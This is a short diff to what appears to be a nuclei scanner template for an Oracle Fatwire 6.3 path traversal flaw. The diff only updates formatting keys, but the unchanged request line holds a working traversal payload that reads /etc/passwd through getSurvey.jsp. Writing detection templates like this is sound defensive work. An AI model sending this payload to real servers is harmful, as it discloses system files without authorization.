@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oracle-fatwire-lfi
 info:
   name: Oracle Fatwire 6.3 - Path Traversal
@@ -7,7 +8,7 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/50167
   tags: lfi,oracle,fatwire
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
